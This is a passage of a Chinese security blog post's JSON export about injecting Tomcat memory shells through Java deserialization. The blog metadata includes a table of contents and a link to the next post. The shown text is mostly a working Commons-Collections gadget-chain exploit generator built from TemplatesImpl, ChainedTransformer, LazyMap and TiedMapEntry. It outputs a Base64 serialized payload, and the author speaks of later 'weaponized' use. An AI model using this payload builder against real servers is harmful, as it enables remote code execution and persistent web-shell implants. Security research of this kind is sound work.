#B392F0\">        </span><span style=\"color: #79B8FF\">tfactoryField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">tfactoryField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">set(templates</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> TransformerFactoryImpl());</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">InstantiateTransformer</span><span style=\"color: #B392F0\"> instantiateTransformer</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> InstantiateTransformer(</span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Class</span><span style=\"color: #B392F0\">[]&#123;</span><span style=\"color: #79B8FF\">Templates</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">&#125;</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\">[]&#123;templates&#125;);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Transformer</span><span style=\"color: #B392F0\">[] transformer</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Transformer</span><span style=\"color: #B392F0\">[]&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> ConstantTransformer(</span><span style=\"color: #79B8FF\">TrAXFilter</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">,</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                instantiateTransformer</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        &#125;;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">ChainedTransformer</span><span style=\"color: #B392F0\"> chainedTransformer </span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> ChainedTransformer(transformer);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">Object</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\">&gt; map</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\">&lt;&gt;();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Map</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">Object</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\">&gt; lazymap </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">LazyMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">decorate(map</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> ConstantTransformer(</span><span style=\"color: #F8F8F8\">1</span><span style=\"color: #B392F0\">));</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">TiedMapEntry</span><span style=\"color: #B392F0\"> tiedMapeEntry</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> TiedMapEntry(lazymap</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #FFAB70\">&quot;aaa&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\">&lt;</span><span style=\"color: #F97583\">Object</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\">&gt; hashMap</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">HashMap</span><span style=\"color: #B392F0\">&lt;&gt;();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">hashMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">put(tiedMapeEntry</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #FFAB70\">&quot;bbb&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">lazymap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">remove(</span><span style=\"color: #FFAB70\">&quot;aaa&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Class</span><span style=\"color: #B392F0\"> c</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">LazyMap</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">class</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> factoryField</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">c</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;factory&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">factoryField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">factoryField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">set(lazymap</span><span style=\"color: #BBBBBB\">,</span><span style=\"color: #B392F0\">chainedTransformer);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">ByteArrayOutputStream</span><span style=\"color: #B392F0\"> byteArrayOutputStream</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">Serial(hashMap);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> payload</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> Base64Encode(byteArrayOutputStream);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">//本地反序列化测试</span></span>\n<span class=\"line\"><span style=\"color: #6B737C\">//        byte[] bytes2= Base64.getDecoder().decode(payload);</span></span>\n<span class=\"line\"><span style=\"color: #6B737C\">//        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes2));</span></span>\n<span class=\"line\"><span style=\"color: #6B737C\">//        in.readObject();</span></span>\n<span class=\"line\"><span style=\"color: #6B737C\">//        in.close();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">private</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">static</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">ByteArrayOutputStream</span><span style=\"color: #B392F0\"> Serial(</span><span style=\"color: #F97583\">Map</span><span style=\"color: #B392F0\"> hashMap) </span><span style=\"color: #F97583\">throws</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">Exception</span><span style=\"color: #B392F0\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">ByteArrayOutputStream</span><span style=\"color: #B392F0\"> bs </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> ByteArrayOutputStream();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">ObjectOutputStream</span><span style=\"color: #B392F0\"> out </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> ObjectOutputStream(bs);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">out</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">writeObject(hashMap);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">return</span><span style=\"color: #B392F0\"> bs;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">private</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">static</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> Base64Encode(</span><span style=\"color: #F97583\">ByteArrayOutputStream</span><span style=\"color: #B392F0\"> bs)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">byte</span><span style=\"color: #B392F0\">[] encode </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Base64</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getEncoder()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">encode(</span><span style=\"color: #79B8FF\">bs</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">toByteArray());</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> s </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> String(encode);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">System</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">out</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">println(</span><span style=\"color: #79B8FF\">URLEncoder</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">encode(s));</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #79B8FF\">System</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">out</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">println(</span><span style=\"color: #79B8FF\">s</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">length());</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">return</span><span style=\"color: #B392F0\"> s;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span></code></pre></div><p>单论整体的获取下来，总结 14000 多字节的 payload<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1722173745499-a9263ced-3fba-4094-88ef-59280423a0f5.png#averageHue=%232c2d30&clientId=u21d37365-99b3-4&from=paste&height=108&id=u8cdc2f7b&originHeight=203&originWidth=2358&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=204535&status=done&style=none&taskId=ub8315766-37f1-426b-a7cd-3a3e2f5a280&title=&width=1257.6\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>很恐怖啊，所以后续的武器化利用时我会和 yyjccc 师傅讨论一下这一点。但这篇理论基础就到这了，希望能够帮到师傅们解决一些问题</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://goodapple.top/archives/1355\">https://goodapple.top/archives/1355</a><br><a href=\"https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93%E5%85%A5Servlet%E5%86%85%E5%AD%98%E9%A9%AC\">https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93%E5%85%A5Servlet%E5%86%85%E5%AD%98%E9%A9%AC</a><br>两位师傅的文章主要是用来对比 POC 以及大致思路的一个构造，文章逻辑和细节可能不太相同，但还是膜了（</p>\n","feature":true,"text":"背景引入多适用于对方机器不出网，无法弹 shell 的情况，用来获取命令执行的结果。如果是能够解析 JSP 的中间件就很好利用，落地一个 JSP 进行一个 Re...","permalink":"/post/内存马回显技术","photos":[],"count_time":{"symbolsCount":"36k","symbolsTime":"33 mins."},"categories":[{"name":"锻刀的理论学习-EchoMemshell","slug":"锻刀的理论学习-EchoMemshell","count":1,"path":"api/categories/锻刀的理论学习-EchoMemshell.json"}],"tags":[{"name":"锻刀","slug":"锻刀","count":14,"path":"api/tags/锻刀.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%83%8C%E6%99%AF%E5%BC%95%E5%85%A5\"><span class=\"toc-text\">背景引入</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ThreadLocal-Response-%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">ThreadLocal Response 回显</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-ThreadLocal-%E8%AE%A4%E8%AF%86\"><span class=\"toc-text\">0x01 ThreadLocal 认识</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90%E5%8F%8A%E5%85%B7%E4%BD%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">0x02 思路分析及具体代码执行内容</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">0x03 总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%85%A8%E5%B1%80%E5%AD%98%E5%82%A8-Response\"><span class=\"toc-text\">全局存储 Response</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-%E5%88%9D%E6%AD%A5%E6%80%9D%E8%B7%AF%E5%BB%BA%E7%AB%8B\"><span class=\"toc-text\">0x01 初步思路建立</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E6%80%9D%E8%B7%AF%E6%A2%B3%E7%90%86%E5%92%8C%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">0x02 思路梳理和总结</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0\"><span class=\"toc-text\">0x03 代码实现</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">0x04 总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC\"><span class=\"toc-text\">反序列化打入内存马</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">环境测试</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B7%E4%BD%93%E6%9E%84%E9%80%A0\"><span class=\"toc-text\">具体构造</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83\"><span class=\"toc-text\">参考</span></a></li></ol>","author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/29/66a7ad417ef9e.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{},"next_post":{"title":"Scala反序列化学习","uid":"48e10c1cbdfed8072bf73a256dffc031","slug":"Scala反序列化","date":"2024-07-06T07:41:00.000Z","updated":"2024-07-06T07:47:03.195Z","comments":true,"path":"api/articles/Scala反序列化.json","keywords":null,"cover":"https://bu.dusays.com/2024/07/06/6688f65f8215e.png","text":"复现 CVE 的时候遇到了，趁此机会学一下原 CVE 的 issuehttps://github.com/scala/scala/pull/10118环境链接：...","permalink":"/post/Scala反序列化","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[{"name":"锻刀-Scala反序列化","slug":"锻刀-Scala反序列化","count":1,"path":"api/categories/锻刀-Scala反序列化.json"}],"tags":[{"name":"锻刀","slug":"锻刀","count":14,"path":"api/tags/锻刀.json"}],"author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/29/66a7ad417ef9e.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}